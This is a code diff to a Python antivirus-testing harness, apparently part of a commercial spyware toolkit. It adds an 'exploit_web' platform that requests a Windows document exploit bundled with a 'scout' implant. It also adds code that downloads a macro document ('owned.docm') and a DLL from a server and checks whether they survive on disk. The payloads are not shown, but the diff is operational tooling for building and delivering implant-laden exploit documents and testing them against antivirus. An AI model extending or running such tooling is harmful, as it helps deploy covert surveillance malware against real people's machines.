@@ -221,11 +221,16 @@ class AVAgent:
                 "platform":"exploit", "deliver": {"user":"USERID"},
                 "melt":{"filename":"example.ppsx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
             }
+            params['exploit_web'] = {"generate": 
+                    {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-002", 
+                    "melt":{"demo":False, "scout":True, "admin":False}}, 
+                "platform":"exploit", "deliver": {"user":"USERID"},
+                "melt":{"filename":"example.docx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
+            }
 
             param = params[self.platform]
 
             try:
-                
                 filename = 'build/%s/build.zip' % self.platform
                 if os.path.exists(filename):
                     os.remove(filename)
@@ -497,24 +502,72 @@ class AVAgent:
                 appname = "exp_%s/avtest.swf" % self.hostname
             elif self.platform == 'exploit_ppsx':
                 appname = "pexp_%s/avtest.swf" % self.hostname
+            elif self.platform == 'exploit_web':
+                dllname = "exp_%s/PMIEFuck-WinWord.dll" % self.hostname
+                docname = "exp_%s/owned.docm" % self.hostname
 
             url = "http://%s/%s" % (self.host[1], appname)
             print "DBG getting: %s" % url
+            done = False
             try:
                 u = urllib2.urlopen(url)
                 localFile = open('build/file.swf', 'w')
                 localFile.write(u.read())
                 localFile.close()
+                sleep(2)
                 with open('build/file.swf'): 
-                    print "+ SUCCESS EXPLOIT"
+                    done = True
+                if "exploit_web" in self.platform:
+                    url = "http://%s/%s" % (self.host[1], docname)
+                    u = urllib2.urlopen(url)
+                    docFile = open('build/owned.docm', 'w')
+                    docFile.write(u.read())
+                    docFile.close()
+                    sleep(2)
+                    with open('build/owned.docm'):
+                        done = True
+                    url = "http://%s/%s" % (self.host[1], dllname)
+                    u = urllib2.urlopen(url)
+                    docFile = open('build/PMIEFuck-WinWord.dll', 'w')
+                    docFile.write(u.read())
+                    docFile.close()
+                    sleep(2)
+                    with open('build/PMIEFuck-WinWord.dll'):
+                        done = True
+                if done == True:
+                    print "+ SUCCESS EXPLOIT SAVE"
             except urllib2.HTTPError:
                 print "+ ERROR EXPLOIT DOWNLOAD"
                 pass
             except IOError:
-                print "+ ERROR EXPLOIT SAVE"
+                print "+ FAILED EXPLOIT SAVE"
                 pass
 
         return factory_id, ident, exe
+
+    def execute_web_expl(self, websrv):
+        """ WEBZ: we need to download some files only """
+        def check_file(filename):
+            try:
+                with open(filename):
+                    print "DBG %s saved"
+                    return True
+            except IOError:
+                print "DBG failed saving %s" % appname
+                return False
+
+        appname = ""
+        done = True
+        filez = [ "assets/avtest.swf", "assets/owned.docm", "assets/PMIEFuck-WinWord.dll" ]
+
+        for appname in filez:
+            if check_file(appname) is False:
+                done = False
+                break
+        if done is True:
+                print "+ SUCCESS EXPLOIT SAVE"
+        else:
+            print "+ FAILED EXPLOIT SAVE"
 
 internet_checked = False
 def execute_agent(args, level, platform):
@@ -539,19 +592,24 @@ def execute_agent(args, level, platform):
     print "- Server: %s/%s %s" % (args.backend,args.frontend, args.kind)
     #vmavtest = AVAgent( args.backend, args.frontend , platform, args.kind, ftype, args.blacklist )
 
-    if vmavtest.create_user_machine():
-        print "+ SUCCESS USER CONNECT"
-        if not vmavtest.server_errors():
-            print "+ SUCCESS SERVER CONNECT"
-            action = {"elite": vmavtest.execute_elite, "scout": vmavtest.execute_scout, "pull": vmavtest.execute_pull}
-            action[level]()
+    if platform == "exploit_web":
+        vmavtest.execute_web_expl(args.frontend)
+        vmavtest._send_results("ENDED")
+#        exit(0)
+    else:
+        if vmavtest.create_user_machine():
+            print "+ SUCCESS USER CONNECT"
+            if not vmavtest.server_errors():
+                print "+ SUCCESS SERVER CONNECT"
+                action = {"elite": vmavtest.execute_elite, "scout": vmavtest.execute_scout, "pull": vmavtest.execute_pull}
+                action[level]()
+                vmavtest._send_results("ENDED")
+            else:
+                print "+ ERROR SERVER ERRORS"
             vmavtest._send_results("ENDED")
         else:
-            print "+ ERROR SERVER ERRORS"
-        vmavtest._send_results("ENDED")
-    else:
-        print "+ ERROR USER CREATE"
-        vmavtest._send_results("ENDED")
+            print "+ ERROR USER CREATE"
+            vmavtest._send_results("ENDED")
 
 def elite(args):
     """ starts a elite """
@@ -562,7 +620,8 @@ def scout(args):
     execute_agent(args, "scout", args.platform)
 
 def pull(args):
-    """ deploys one or all platforms ('windows', 'linux', 'osx', 'exploit', 'exploit_docx', 'android', 'blackberry', 'ios') """
+    """ deploys one or all platforms 
+    ('windows', 'linux', 'osx', 'exploit', 'exploit_docx', 'android', 'blackberry', 'ios') """
     if args.platform == "all":
         for platform in args.platform_type.keys():
             if platform.startswith("exploit"):
@@ -595,7 +654,7 @@ def clean(args):
     vmavtest._delete_targets(operation)
    
 def main():
-    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit', 'exploit_docx', 'exploit_ppsx' ]
+    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit', 'exploit_docx', 'exploit_ppsx', 'exploit_web' ]
     platform_mobile =  [ 'android', 'blackberry', 'ios' ]
 
     platform_type = {}
